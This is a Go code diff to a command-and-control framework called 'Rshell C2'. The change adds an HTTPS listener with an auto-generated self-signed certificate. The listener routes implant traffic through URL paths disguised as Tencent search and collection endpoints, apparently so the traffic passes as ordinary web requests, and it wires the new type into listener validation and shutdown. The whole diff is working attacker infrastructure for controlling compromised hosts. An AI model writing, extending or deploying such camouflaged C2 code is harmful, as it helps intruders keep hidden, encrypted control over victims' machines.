@@ -9,9 +9,16 @@ import (
 	"Rshell/pkg/database"
 	"Rshell/pkg/logger"
 	"context"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
+	"encoding/pem"
 	"fmt"
 	"github.com/gin-gonic/gin"
 	"github.com/xtaci/kcp-go/v5"
+	"math/big"
 	"net"
 	"net/http"
 	"strings"
@@ -244,6 +251,8 @@ func startListener(listenerType, listenerAddress string) error {
 		return startKCPServer(listenerAddress)
 	case "http":
 		return startHTTPServer(listenerAddress)
+	case "https":
+		return startHTTPSServer(listenerAddress)
 	case "oss":
 		return startOSSServer(listenerAddress)
 	default:
@@ -267,7 +276,7 @@ func stopListener(listenerType, listenerAddress string) error {
 	close(instance.StopChan)
 
 	switch listenerType {
-	case "websocket", "http":
+	case "websocket", "http", "https":
 		if server, ok := instance.Server.(*http.Server); ok {
 			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 			defer cancel()
@@ -536,6 +545,118 @@ func startHTTPServer(listenerAddress string) error {
 	return nil
 }
 
+// generateSelfSignedCert 生成自签名TLS证书
+func generateSelfSignedCert() (tls.Certificate, error) {
+	// 生成RSA私钥
+	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to generate private key: %w", err)
+	}
+
+	// 生成随机序列号
+	serialNumber, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to generate serial number: %w", err)
+	}
+
+	// 构建证书模板
+	template := &x509.Certificate{
+		SerialNumber: serialNumber,
+		Subject: pkix.Name{
+			CommonName: "Rshell C2",
+		},
+		NotBefore:             time.Now(),
+		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1年有效期
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+		IPAddresses:           []net.IP{net.ParseIP("0.0.0.0")},
+	}
+
+	// 自签名证书
+	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &privateKey.PublicKey, privateKey)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to create certificate: %w", err)
+	}
+
+	// 编码私钥为PEM
+	privKeyBytes := x509.MarshalPKCS1PrivateKey(privateKey)
+	privKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privKeyBytes})
+
+	// 编码证书为PEM
+	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+
+	// 加载TLS证书
+	cert, err := tls.X509KeyPair(certPEM, privKeyPEM)
+	if err != nil {
+		return tls.Certificate{}, fmt.Errorf("failed to load key pair: %w", err)
+	}
+
+	return cert, nil
+}
+
+// startHTTPSServer 启动HTTPS服务器（自签名证书）
+func startHTTPSServer(listenerAddress string) error {
+	mux := http.NewServeMux()
+	mux.HandleFunc("/tencent/mcp/pc/pcsearch", communication.GetHttp)
+	mux.HandleFunc("/tencent/sensearch/collection/item/check", communication.PostHttp)
+
+	// 生成自签名证书
+	cert, err := generateSelfSignedCert()
+	if err != nil {
+		return fmt.Errorf("failed to generate TLS cert: %w", err)
+	}
+
+	// 创建 TLS listener
+	tcpListener, err := net.Listen("tcp", listenerAddress)
+	if err != nil {
+		return fmt.Errorf("failed to listen on TCP for HTTPS: %w", err)
+	}
+
+	tlsListener := tls.NewListener(tcpListener, &tls.Config{
+		Certificates: []tls.Certificate{cert},
+	})
+
+	server := &http.Server{
+		Handler:        mux,
+		ReadTimeout:    15 * time.Second,
+		WriteTimeout:   15 * time.Second,
+		MaxHeaderBytes: 1 << 20,
+	}
+
+	instance := &ServerInstance{
+		Type:      "https",
+		Address:   listenerAddress,
+		Server:    server,
+		StopChan:  make(chan struct{}),
+		IsRunning: true,
+		StartedAt: time.Now(),
+		Stats:     &ServerStats{},
+	}
+
+	portManager.mu.Lock()
+	portManager.Servers[listenerAddress] = instance
+	portManager.mu.Unlock()
+
+	go func() {
+		defer func() {
+			instance.IsRunning = false
+			tlsListener.Close()
+			portManager.mu.Lock()
+			delete(portManager.Servers, listenerAddress)
+			portManager.mu.Unlock()
+		}()
+
+		logger.Info("HTTPS server starting on", listenerAddress)
+		if err := server.Serve(tlsListener); err != nil && err != http.ErrServerClosed {
+			logger.Error("HTTPS server error:", err)
+		}
+		logger.Info("HTTPS server stopped:", listenerAddress)
+	}()
+
+	return nil
+}
+
 // startOSSServer 启动OSS服务器
 func startOSSServer(listenerAddress string) error {
 	parts := strings.Split(listenerAddress, ":")
@@ -588,6 +709,7 @@ func isValidListenerType(listenerType string) bool {
 		"tcp":       true,
 		"kcp":       true,
 		"http":      true,
+		"https":     true,
 		"oss":       true,
 	}
 	return validTypes[listenerType]
@@ -683,7 +805,7 @@ func StopAllServers() {
 
 			// 根据类型执行不同的停止逻辑
 			switch instance.Type {
-			case "websocket", "http":
+			case "websocket", "http", "https":
 				if server, ok := instance.Server.(*http.Server); ok {
 					ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 					server.Shutdown(ctx)
